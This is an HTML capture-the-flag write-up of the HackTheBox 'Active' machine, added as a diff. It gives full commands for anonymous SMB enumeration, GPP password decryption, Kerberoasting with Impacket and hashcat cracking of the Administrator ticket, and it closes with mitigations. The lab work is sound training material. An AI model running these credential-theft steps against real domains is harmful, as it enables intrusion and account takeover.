@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB — Active | Machine Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=IBM+Plex+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c10;
+    --surface: #0f1218;
+    --surface2: #151b24;
+    --border: #1e2d3d;
+    --accent: #00d9ff;
+    --accent2: #ff4f5e;
+    --accent3: #39ff14;
+    --text: #c9d1d9;
+    --text-dim: #6e7681;
+    --text-bright: #e6edf3;
+    --pwned: #39ff14;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 16px;
+    line-height: 1.7;
+    min-height: 100vh;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,217,255,0.015) 2px, rgba(0,217,255,0.015) 4px);
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  .header {
+    border-bottom: 1px solid var(--border);
+    padding: 40px 0 0;
+    background: linear-gradient(180deg, rgba(0,217,255,0.04) 0%, transparent 100%);
+  }
+
+  .container { max-width: 900px; margin: 0 auto; padding: 0 32px; }
+
+  .badge-row {
+    display: flex; gap: 10px; align-items: center; margin-bottom: 24px;
+    flex-wrap: wrap;
+  }
+
+  .badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    padding: 4px 12px;
+    border-radius: 2px;
+    border: 1px solid;
+  }
+  .badge-easy   { color: var(--accent3); border-color: var(--accent3); background: rgba(57,255,20,0.07); }
+  .badge-win    { color: var(--accent);  border-color: var(--accent);  background: rgba(0,217,255,0.07); }
+  .badge-ad     { color: #f5a623;        border-color: #f5a623;        background: rgba(245,166,35,0.07); }
+  .badge-pwned  { color: var(--pwned);   border-color: var(--pwned);   background: rgba(57,255,20,0.12);
+                  animation: pulse 2s ease-in-out infinite; }
+
+  @keyframes pulse {
+    0%,100% { box-shadow: 0 0 6px rgba(57,255,20,0.4); }
+    50%      { box-shadow: 0 0 16px rgba(57,255,20,0.8); }
+  }
+
+  .machine-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 72px;
+    font-weight: 700;
+    color: var(--text-bright);
+    letter-spacing: -1px;
+    line-height: 1;
+    margin-bottom: 8px;
+  }
+
+  .machine-title span {
+    color: var(--accent);
+    text-shadow: 0 0 30px rgba(0,217,255,0.5);
+  }
+
+  .subtitle {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--text-dim);
+    margin-bottom: 40px;
+    letter-spacing: 1px;
+  }
+
+  .meta-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    border-top: 1px solid var(--border);
+    border-left: 1px solid var(--border);
+    margin-bottom: 0;
+  }
+
+  .meta-cell {
+    padding: 16px 20px;
+    border-right: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .meta-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+
+  .meta-value {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--accent);
+    font-family: 'IBM Plex Mono', monospace;
+  }
+
+  /* Main content */
+  main { padding: 60px 0; }
+
+  .section {
+    margin-bottom: 56px;
+    animation: fadeIn 0.5s ease both;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(12px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 24px;
+  }
+
+  .step-num {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 2px;
+    white-space: nowrap;
+  }
+
+  .section-title {
+    font-size: 26px;
+    font-weight: 700;
+    color: var(--text-bright);
+    letter-spacing: 0.5px;
+  }
+
+  .divider-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 14px;
+    font-size: 16px;
+    line-height: 1.8;
+  }
+
+  strong { color: var(--text-bright); font-weight: 600; }
+
+  /* Code blocks */
+  .code-block {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    border-radius: 4px;
+    margin: 20px 0;
+    overflow: hidden;
+  }
+
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 16px;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-lang {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .code-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+
+  pre {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 13px;
+    line-height: 1.7;
+    color: #a8c4d6;
+    padding: 20px;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .hl-cmd   { color: var(--accent); }
+  .hl-flag  { color: #f5a623; }
+  .hl-path  { color: #c3e88d; }
+  .hl-val   { color: var(--accent2); }
+  .hl-pwn   { color: var(--pwned); font-weight: 600; }
+  .hl-com   { color: var(--text-dim); font-style: italic; }
+
+  /* Finding cards */
+  .finding-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 20px 24px;
+    margin: 16px 0;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .finding-card::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 3px;
+    background: var(--accent3);
+  }
+
+  .finding-card.danger::before { background: var(--accent2); }
+  .finding-card.critical::before { background: var(--pwned); }
+
+  .finding-title {
+    font-weight: 700;
+    font-size: 15px;
+    color: var(--text-bright);
+    margin-bottom: 6px;
+    font-family: 'IBM Plex Mono', monospace;
+  }
+
+  /* Timeline */
+  .timeline {
+    position: relative;
+    padding-left: 32px;
+  }
+
+  .timeline::before {
+    content: '';
+    position: absolute;
+    left: 8px; top: 8px; bottom: 8px;
+    width: 1px;
+    background: linear-gradient(180deg, var(--accent), var(--accent2), var(--pwned));
+  }
+
+  .tl-item {
+    position: relative;
+    margin-bottom: 28px;
+  }
+
+  .tl-item::before {
+    content: '';
+    position: absolute;
+    left: -28px;
+    top: 7px;
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: var(--accent);
+    border: 2px solid var(--bg);
+    box-shadow: 0 0 8px rgba(0,217,255,0.6);
+  }
+
+  .tl-item:last-child::before { background: var(--pwned); box-shadow: 0 0 12px rgba(57,255,20,0.8); }
+
+  .tl-step {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+
+  .tl-title {
+    font-size: 18px;
+    font-weight: 700;
+    color: var(--text-bright);
+    margin-bottom: 4px;
+  }
+
+  .tl-desc {
+    color: var(--text-dim);
+    font-size: 14px;
+  }
+
+  /* Credential box */
+  .cred-box {
+    background: rgba(57,255,20,0.05);
+    border: 1px solid rgba(57,255,20,0.2);
+    border-radius: 4px;
+    padding: 20px 24px;
+    display: flex;
+    gap: 40px;
+    flex-wrap: wrap;
+    margin: 20px 0;
+  }
+
+  .cred-item { display: flex; flex-direction: column; gap: 4px; }
+
+  .cred-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+  }
+
+  .cred-val {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--pwned);
+  }
+
+  /* Flags */
+  .flag-card {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    background: var(--surface2);
+    border: 1px solid rgba(57,255,20,0.3);
+    border-radius: 4px;
+    padding: 18px 24px;
+    margin: 12px 0;
+    box-shadow: 0 0 20px rgba(57,255,20,0.05);
+  }
+
+  .flag-icon {
+    font-size: 28px;
+    filter: drop-shadow(0 0 8px rgba(57,255,20,0.5));
+  }
+
+  .flag-type {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 2px;
+  }
+
+  .flag-val {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 14px;
+    color: var(--pwned);
+    letter-spacing: 1px;
+  }
+
+  /* Footer */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 32px 0;
+    text-align: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+  }
+
+  footer span { color: var(--accent); }
+
+  @media (max-width: 640px) {
+    .machine-title { font-size: 48px; }
+    .meta-grid { grid-template-columns: 1fr 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="container">
+    <div class="badge-row">
+      <span class="badge badge-easy">Easy</span>
+      <span class="badge badge-win">Windows</span>
+      <span class="badge badge-ad">Active Directory</span>
+      <span class="badge badge-pwned">✓ Pwned</span>
+    </div>
+    <h1 class="machine-title">HTB — <span>Active</span></h1>
+    <p class="subtitle">HackTheBox · Windows Active Directory · Kerberoasting · GPP Credential Abuse</p>
+    <div class="meta-grid">
+      <div class="meta-cell">
+        <div class="meta-label">Target IP</div>
+        <div class="meta-value">10.129.5.184</div>
+      </div>
+      <div class="meta-cell">
+        <div class="meta-label">OS</div>
+        <div class="meta-value">Windows Server 2008 R2</div>
+      </div>
+      <div class="meta-cell">
+        <div class="meta-label">Domain</div>
+        <div class="meta-value">active.htb</div>
+      </div>
+      <div class="meta-cell">
+        <div class="meta-label">Date</div>
+        <div class="meta-value">Mar 19, 2026</div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="container">
+
+    <!-- Overview -->
+    <section class="section">
+      <div class="section-header">
+        <span class="step-num">00 ——</span>
+        <h2 class="section-title">Overview</h2>
+        <div class="divider-line"></div>
+      </div>
+      <p>
+        <strong>Active</strong> is an Easy-rated Windows machine on HackTheBox that simulates a real-world Windows Server 2008 R2 Domain Controller running Active Directory. Despite its "Easy" rating, it covers two highly relevant and frequently seen attack techniques in real penetration tests: <strong>Group Policy Preferences (GPP) credential exposure</strong> and <strong>Kerberoasting</strong>.
+      </p>
+      <p>
+        The attack chain begins with anonymous SMB enumeration to discover a readable <strong>Replication</strong> share, which leaks an encrypted password from a <code>Groups.xml</code> GPP file. After decrypting it with <code>gpp-decrypt</code>, we obtain credentials for the <strong>SVC_TGS</strong> service account. Using these credentials, we perform a Kerberoasting attack against the Administrator account, crack the resulting TGS ticket hash with hashcat, and achieve full domain compromise.
+      </p>
+
+      <div class="timeline" style="margin-top:32px;">
+        <div class="tl-item">
+          <div class="tl-step">Step 01</div>
+          <div class="tl-title">Port & Service Enumeration</div>
+          <div class="tl-desc">Nmap scan reveals classic DC ports — DNS, Kerberos, LDAP, SMB. Domain: active.htb</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-step">Step 02</div>
+          <div class="tl-title">SMB Anonymous Enumeration</div>
+          <div class="tl-desc">smbmap identifies a world-readable Replication share with no credentials required</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-step">Step 03</div>
+          <div class="tl-title">GPP Password Discovery</div>
+          <div class="tl-desc">Groups.xml inside SYSVOL-replicated policies contains an AES-encrypted cpassword</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-step">Step 04</div>
+          <div class="tl-title">GPP Decryption → SVC_TGS Access</div>
+          <div class="tl-desc">gpp-decrypt reveals plaintext credentials for active.htb\SVC_TGS. User flag captured.</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-step">Step 05</div>
+          <div class="tl-title">Kerberoasting Administrator</div>
+          <div class="tl-desc">GetUserSPNs.py requests a TGS for the Administrator SPN (active/CIFS:445)</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-step">Step 06</div>
+          <div class="tl-title">Hash Cracking → Full Compromise</div>
+          <div class="tl-desc">Hashcat cracks the TGS-REP hash. Administrator password retrieved. Root flag captured. 🏴</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Step 1 -->
+    <section class="section">
+      <div class="section-header">
+        <span class="step-num">01 ——</span>
+        <h2 class="section-title">Reconnaissance — Nmap</h2>
+        <div class="divider-line"></div>
+      </div>
+      <p>
+        We begin with a full service version scan against the target to identify open ports and determine the attack surface.
+      </p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <span class="code-label">nmap scan</span>
+        </div>
+        <pre><span class="hl-cmd">nmap</span> <span class="hl-flag">-sC -sV</span> <span class="hl-val">10.129.5.184</span></pre>
+      </div>
+      <p><strong>Key findings from the scan:</strong></p>
+      <div class="finding-card">
+        <div class="finding-title">Classic Domain Controller fingerprint</div>
+        <p style="margin:0; font-size:14px;">Ports 53 (DNS), 88 (Kerberos), 389/3268 (LDAP), 445 (SMB), 464 (kpasswd) all open — confirming this is a Windows Active Directory Domain Controller. LDAP banner leaks the domain name: <strong>active.htb</strong>. OS is Windows Server 2008 R2 SP1.</p>
+      </div>
+      <div class="finding-card">
+        <div class="finding-title">SMB Signing Enabled</div>
+        <p style="margin:0; font-size:14px;">SMB2 security mode shows message signing is required — relay attacks (SMB relay / NTLM relay) are not viable here. We pivot to other attack surfaces.</p>
+      </div>
+    </section>
+
+    <!-- Step 2 -->
+    <section class="section">
+      <div class="section-header">
+        <span class="step-num">02 ——</span>
+        <h2 class="section-title">SMB Enumeration — Anonymous Access</h2>
+        <div class="divider-line"></div>
+      </div>
+      <p>
+        With the domain identified, we use <code>smbmap</code> to enumerate available SMB shares using a null/anonymous session.
+      </p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <span class="code-label">smbmap anonymous</span>
+        </div>
+        <pre><span class="hl-cmd">smbmap</span> <span class="hl-flag">-H</span> <span class="hl-val">10.129.5.184</span></pre>
+      </div>
+      <div class="finding-card">
+        <div class="finding-title">🔍 Replication Share — READ ONLY (No Auth Required)</div>
+        <p style="margin:0; font-size:14px;">While ADMIN$, C$, IPC$, NETLOGON, SYSVOL, and Users all require authentication, the <strong>Replication</strong> share is accessible anonymously with read-only permissions. This is a misconfigured SYSVOL replica — a goldmine for GPP attacks.</p>
+      </div>
+    </section>
+
+    <!-- Step 3 -->
+    <section class="section">
+      <div class="section-header">
+        <span class="step-num">03 ——</span>
+        <h2 class="section-title">Exploring the Replication Share</h2>
+        <div class="divider-line"></div>
+      </div>
+      <p>
+        We recursively enumerate the Replication share to map out its directory structure and look for sensitive files.
+      </p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <span class="code-label">recursive share enumeration</span>
+        </div>
+        <pre><span class="hl-cmd">smbmap</span> <span class="hl-flag">-H</span> <span class="hl-val">10.129.5.184</span> <span class="hl-flag">-r</span> Replication <span class="hl-flag">--depth</span> 10</pre>
+      </div>
+      <p>
+        The share mirrors a SYSVOL structure containing Active Directory Group Policies. Navigating the folder tree, we find the critical file at:
+      </p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">path</span>
+          <span class="code-label">discovered file</span>
+        </div>
+        <pre><span class="hl-path">Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml</span>
+<span class="hl-com"># 533 bytes — contains Group Policy Preferences user configuration</span></pre>
+      </div>
+    </section>
+
+    <!-- Step 4 -->
+    <section class="section">
+      <div class="section-header">
+        <span class="step-num">04 ——</span>
+        <h2 class="section-title">GPP Password Decryption</h2>
+        <div class="divider-line"></div>
+      </div>
+      <p>
+        We download and read <code>Groups.xml</code>. This file was created by a Group Policy Preferences task that sets a local user account password — a practice Microsoft deprecated in MS14-025, but the encrypted credential remains in this old deployment.
+      </p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">xml</span>
+          <span class="code-label">Groups.xml content</span>
+        </div>
+        <pre><span class="hl-com">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+&lt;Groups&gt;
+  &lt;User name=<span class="hl-val">"active.htb\SVC_TGS"</span>
+        cpassword=<span class="hl-val">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeX..."</span>
+        userName=<span class="hl-val">"active.htb\SVC_TGS"</span> /&gt;
+&lt;/Groups&gt;</pre>
+      </div>
+      <p>
+        The <code>cpassword</code> field is AES-256 encrypted — but Microsoft publicly documented the static decryption key in their MSDN documentation (MS14-025). The tool <code>gpp-decrypt</code> uses this known key to decrypt it instantly:
+      </p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <span class="code-label">GPP decryption</span>
+        </div>
+        <pre><span class="hl-cmd">gpp-decrypt</span> <span class="hl-val">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span>
+
+<span class="hl-pwn">GPPstillStandingStrong2k18</span></pre>
+      </div>
+      <div class="cred-box">
+        <div class="cred-item">
+          <span class="cred-label">Username</span>
+          <span class="cred-val">active.htb\SVC_TGS</span>
+        </div>
+        <div class="cred-item">
+          <span class="cred-label">Password</span>
+          <span class="cred-val">GPPstillStandingStrong2k18</span>
+        </div>
+      </div>
+      <p>
+        With these credentials we authenticate to the <strong>Users</strong> share via smbclient and retrieve the user flag from <code>SVC_TGS\Desktop\user.txt</code>.
+      </p>
+      <div class="flag-card">
+        <span class="flag-icon">🚩</span>
+        <div>
+          <div class="flag-type">User Flag</div>
+          <div class="flag-val">SVC_TGS\Desktop\user.txt — ✓ Captured</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Step 5 -->
+    <section class="section">
+      <div class="section-header">
+        <span class="step-num">05 ——</span>
+        <h2 class="section-title">Kerberoasting — TGS Request</h2>
+        <div class="divider-line"></div>
+      </div>
+      <p>
+        With valid domain credentials, we can perform <strong>Kerberoasting</strong>. This attack requests Kerberos TGS tickets for accounts with registered Service Principal Names (SPNs). The tickets are encrypted with the service account's NTLM hash and can be cracked offline.
+      </p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <span class="code-label">Impacket GetUserSPNs</span>
+        </div>
+        <pre><span class="hl-cmd">GetUserSPNs.py</span> active.htb/SVC_TGS:<span class="hl-val">GPPstillStandingStrong2k18</span> <span class="hl-flag">-request -outputfile</span> hashes.txt</pre>
+      </div>
+      <div class="finding-card danger">
+        <div class="finding-title">⚡ SPN Found on Administrator Account</div>
+        <p style="margin:0; font-size:14px;">The <strong>Administrator</strong> account has the SPN <code>active/CIFS:445</code> registered. This is highly unusual and dangerous — a domain admin account acting as a service account means cracking its TGS ticket gives us domain administrator access.</p>
+      </div>
+      <p>
+        Impacket outputs the TGS-REP hash in hashcat-compatible format to <code>hashes.txt</code>:
+      </p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">hash</span>
+          <span class="code-label">Kerberos 5 TGS-REP hash (truncated)</span>
+        </div>
+        <pre><span class="hl-val">$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*</span>
+<span class="hl-val">$58e7e32376b07691c6b9960eea23d89a$30af5d0b2bef...</span>[truncated]</pre>
+      </div>
+    </section>
+
+    <!-- Step 6 -->
+    <section class="section">
+      <div class="section-header">
+        <span class="step-num">06 ——</span>
+        <h2 class="section-title">Hash Cracking with Hashcat</h2>
+        <div class="divider-line"></div>
+      </div>
+      <p>
+        We use hashcat with mode <code>13100</code> (Kerberos 5 TGS-REP) and the rockyou.txt wordlist to crack the hash offline.
+      </p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <span class="code-label">hashcat crack</span>
+        </div>
+        <pre><span class="hl-cmd">hashcat</span> <span class="hl-flag">-m</span> 13100 <span class="hl-flag">-a</span> 0 hashes.txt /usr/share/wordlists/rockyou.txt <span class="hl-flag">--force</span>
+
+<span class="hl-com"># Result (cracked in ~35 seconds):</span>
+...Administrator...<span class="hl-val">:973c02</span><span class="hl-pwn">:Ticketmaster1968</span>
+
+Status: <span class="hl-pwn">Cracked</span>
+Progress: 10539008/14344385 (73.47%)
+Time: 35 seconds</pre>
+      </div>
+      <div class="cred-box">
+        <div class="cred-item">
+          <span class="cred-label">Username</span>
+          <span class="cred-val">active.htb\Administrator</span>
+        </div>
+        <div class="cred-item">
+          <span class="cred-label">Password</span>
+          <span class="cred-val">Ticketmaster1968</span>
+        </div>
+        <div class="cred-item">
+          <span class="cred-label">Privilege</span>
+          <span class="cred-val">Domain Admin 👑</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- Root Flag -->
+    <section class="section">
+      <div class="section-header">
+        <span class="step-num">07 ——</span>
+        <h2 class="section-title">Full Compromise — Root Flag</h2>
+        <div class="divider-line"></div>
+      </div>
+      <p>
+        Using the cracked Administrator credentials, we authenticate to the Users share and navigate to the Administrator's Desktop to retrieve the root flag.
+      </p>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <span class="code-label">smbclient as Administrator</span>
+        </div>
+        <pre><span class="hl-cmd">smbclient</span> //10.129.5.184/Users <span class="hl-flag">-U</span> active.htb/Administrator
+Password: <span class="hl-val">Ticketmaster1968</span>
+
+smb: \&gt; cd Administrator\Desktop\
+smb: \Administrator\Desktop\&gt; ls
+  root.txt    AR    34  <span class="hl-pwn">✓ CAPTURED</span>
+
+smb: \Administrator\Desktop\&gt; more root.txt
+<span class="hl-pwn">[ROOT FLAG]</span></pre>
+      </div>
+      <div class="flag-card">
+        <span class="flag-icon">🏴</span>
+        <div>
+          <div class="flag-type">Root Flag</div>
+          <div class="flag-val">Administrator\Desktop\root.txt — ✓ Captured</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Lessons -->
+    <section class="section">
+      <div class="section-header">
+        <span class="step-num">08 ——</span>
+        <h2 class="section-title">Key Takeaways & Mitigations</h2>
+        <div class="divider-line"></div>
+      </div>
+      <div class="finding-card danger">
+        <div class="finding-title">1. GPP Passwords Are Never Safe (MS14-025)</div>
+        <p style="margin:0; font-size:14px;">Microsoft published the AES key used to encrypt GPP passwords. Any cpassword field in SYSVOL/Group Policy XML files can be trivially decrypted. <strong>Mitigation:</strong> Remove all GPP-stored passwords. Use LAPS (Local Administrator Password Solution) for local account management instead.</p>
+      </div>
+      <div class="finding-card danger">
+        <div class="finding-title">2. Kerberoastable Service Accounts With Weak Passwords</div>
+        <p style="margin:0; font-size:14px;">Any domain user can request TGS tickets for SPN-registered accounts. If those accounts have weak passwords, they will be cracked. <strong>Mitigation:</strong> Use long (25+ char) random passwords on all service accounts. Use Group Managed Service Accounts (gMSA) which auto-rotate. Regularly audit SPNs — especially on high-privilege accounts.</p>
+      </div>
+      <div class="finding-card danger">
+        <div class="finding-title">3. Domain Admins Should Never Have SPNs</div>
+        <p style="margin:0; font-size:14px;">The Administrator account had an SPN registered, making it Kerberoastable. Domain admin accounts should never double as service accounts. <strong>Mitigation:</strong> Segregate privileged accounts from service accounts. Monitor and alert on SPN assignments to privileged users.</p>
+      </div>
+      <div class="finding-card">
+        <div class="finding-title">4. SYSVOL/Replication Share Permissions</div>
+        <p style="margin:0; font-size:14px;">The Replication share was world-readable (anonymous access). While SYSVOL is typically readable by all domain users, anonymous access to a SYSVOL replica is a configuration error. <strong>Mitigation:</strong> Audit SMB share permissions and ensure anonymous access is disabled.</p>
+      </div>
+    </section>
+
+  </div>
+</main>
+
+<footer>
+  <div class="container">
+    HTB — Active · Writeup by <span>@RootX111</span> · <span>active.htb</span> · Pwned on Mar 19, 2026
+  </div>
+</footer>
+
+</body>
+</html>
